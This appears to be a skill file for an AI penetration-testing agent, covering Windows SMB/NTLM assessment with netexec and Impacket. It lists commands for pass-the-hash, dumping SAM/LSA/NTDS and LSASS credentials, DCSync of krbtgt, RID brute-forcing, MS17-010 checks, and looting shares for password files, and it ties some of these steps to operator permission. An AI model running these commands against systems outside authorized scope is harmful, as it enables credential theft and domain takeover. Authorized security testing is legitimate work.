---
name: windows-smb
description: SMB/NTLM on Windows — signing, SMBv1, null/guest, shares, PTH, SAM/LSA/NTDS dumps, RID brute, MS17-010. Use when port 445/139 is in scope.
metadata:
  version: '1.0'
---

# SMB / NTLM

## Signing and dialect

```
run_nxc protocol=smb target=<ip>
```

| Signal | Meaning | Next |
|---|---|---|
| `signing:False` | NTLM relay possible | `windows-coerce-relay`; finding |
| `signing:True` | DC or hardened | Still enum users/shares |
| `SMBv1:True` | Legacy | Finding; EternalBlue only if unpatched (`-M ms17-010`) |
| `(Pwn3d!)` | Admin with current creds | `windows-lateral` / secretsdump |

LDAP **signing** and **channel binding** are separate (`nxc ldap --signing`). Unsigned LDAP bind is a finding if you can bind.

## Null, guest, user

```
nxc smb <ip> -u '' -p '' --shares
nxc smb <ip> -u 'a' -p '' --shares
nxc smb <ip> -u '<user>' -p '<pass>' --shares --users --sessions --disks
nxc smb <ip> -u '<user>' -H '<nt-hash>' --shares   # PTH, no crack
```

Pass-the-hash is in-scope when you already have an NT hash (SAM, NTDS, Kerberoast crack is out of default policy — use the hash as-is).

## SAM / LSA / NTDS (admin)

```
nxc smb <ip> -u <user> -p '<pass>' --sam --lsa --ntds
secretsdump.py '<domain>/<user>:<pass>@<ip>'
secretsdump.py -hashes ':<nt>' '<domain>/<user>@<ip>'
secretsdump.py -k -no-pass '<DOMAIN>/<COMPUTER$>@<fqdn>'   # after Kerberos PTT
```

`SECURITY` LSA secrets, cached logons, DPAPI, and NTDS `ntds.dit` hashes ⇒ domain knowledge. DCSync rights without dumping the whole NTDS: `secretsdump.py -just-dc-user krbtgt` only if you intend a golden-ticket demo and operator policy allows it.

## Remote LSASS (admin)

Prefer `nxc smb <ip> -M lsassy` or `lsassy` over downloading LSASS. Procdump+download is noisier.

## RID / users

```
nxc smb <ip> --rid-brute
lookupsid.py <domain>/<user>:<pass>@<ip>
```

## Extra checks

- **MS17-010:** `nxc smb <ip> -M ms17-010` — finding if vulnerable; exploit only if operator asks.
- **SMBGhost (CVE-2020-0796):** `nxc smb <ip> -M smbghost`.
- **Print spooler:** `nxc smb <ip> -M spooler` → coerce (`windows-coerce-relay`) / PrintNightmare (`windows-privesc`).
- **WebDAV / WebClient:** `nxc smb <ip> -M webdav` — HTTP coerce to ADCS ESC8.
- **Drop SID / drop the mic:** coercion family — see `windows-coerce-relay`.
- **Always check `NETLOGON`/`SYSVOL`** with a domain user for scripts and GPP.

## Files

`smbclient.py '//<ip>/SHARE' -U '<user>%<pass>'` then `get`. Prefer readable backups, `web.config`, `unattend.xml`, `.kdbx`, installers with creds.
